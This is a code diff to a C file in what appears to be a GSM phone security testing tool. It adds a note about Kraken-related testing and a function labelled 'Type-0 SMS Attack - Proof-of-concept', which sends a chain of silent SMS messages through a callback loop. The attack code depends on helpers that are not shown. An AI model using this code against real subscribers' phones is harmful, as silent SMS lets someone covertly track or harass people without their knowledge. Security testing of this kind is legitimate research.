@@ -435,6 +435,9 @@ int execute_testcase_5_step1(struct msgb *msg, struct lapdm_entity *le, void *l3
 	return 0;
 }
 
+/*
+	Testing For Kraken requirements
+*/
 int execute_testcase_5(){
 
 	struct gsm_subscriber subs = gsec_ms->subscr;
@@ -445,4 +448,36 @@ int execute_testcase_5(){
 	vty_out(gsec_vty, "[GSEC][*] Testing for Kraken Requirements \r\n");
 	lapdm_channel_set_l3(&gsec_ms->lapdm_channel, &execute_testcase_5_step1, gsec_ms);
 	return 0;
+}
+
+/**********************************************
+ * Type-0 SMS Attack - Proof-of-concept
+ * 
+***********************************************/
+
+int execute_attack_1(){
+	attack_silentsms.executing = true;
+	attack_silentsms.current_message_number = 0;
+
+	// Set variables for Silent SMS
+	testcase_silentsms.pid = 1;
+	testcase_silentsms.dcs = 1;
+	
+	// Send First SMS
+	aux_sendsms(flag_silentsms_frequencyhopping);
+	attack_silentsms.current_message_number += 1;
+
+}
+
+int execute_attack_1_callback(){
+	// There are still SMS to be sent
+	if (attack_silentsms.current_message_number <= attack_silentsms.chain_messages){
+		vty_out(gsec_vty, "[GXK][-] Sending Silent-SMS #%d\r\n", attack_silentsms.current_message_number);
+		// Send SMS
+		aux_sendsms(flag_silentsms_frequencyhopping);
+		// Increment the count
+		attack_silentsms.current_message_number +=1;
+	} else {
+		vty_out(gsec_vty, "[GXK][-] Attack Finished \r\n");
+	}
 }
